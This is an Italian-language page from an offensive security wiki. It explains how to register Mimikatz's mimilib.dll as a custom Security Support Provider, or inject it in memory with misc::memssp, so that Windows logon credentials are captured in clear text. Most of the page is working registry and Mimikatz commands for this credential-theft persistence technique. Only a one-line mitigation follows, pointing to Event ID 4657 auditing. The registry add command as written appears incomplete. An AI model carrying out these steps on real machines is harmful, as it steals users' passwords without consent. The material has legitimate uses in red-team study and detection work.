# Custom SSP

{{#include ../../banners/hacktricks-training.md}}

### Custom SSP

[Scopri cos'è un SSP (Security Support Provider) qui.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Puoi creare il tuo **SSP** per **catturare** in **testo chiaro** le **credenziali** utilizzate per accedere alla macchina.

#### Mimilib

Puoi utilizzare il file binario `mimilib.dll` fornito da Mimikatz. **Questo registrerà all'interno di un file tutte le credenziali in testo chiaro.**\
Posiziona il dll in `C:\Windows\System32\`\
Ottieni un elenco dei pacchetti di sicurezza LSA esistenti:
```bash:attacker@target
PS C:\> reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages"

HKEY_LOCAL_MACHINE\system\currentcontrolset\control\lsa
Security Packages    REG_MULTI_SZ    kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u
```
Aggiungi `mimilib.dll` alla lista dei fornitori di supporto per la sicurezza (Pacchetti di sicurezza):
```bash
reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages"
```
E dopo un riavvio, tutte le credenziali possono essere trovate in chiaro in `C:\Windows\System32\kiwissp.log`

#### In memoria

Puoi anche iniettare questo in memoria direttamente usando Mimikatz (nota che potrebbe essere un po' instabile/non funzionare):
```bash
privilege::debug
misc::memssp
```
Questo non sopravvivrà ai riavvii.

#### Mitigazione

Event ID 4657 - Audit creazione/modifica di `HKLM:\System\CurrentControlSet\Control\Lsa\SecurityPackages`

{{#include ../../banners/hacktricks-training.md}}
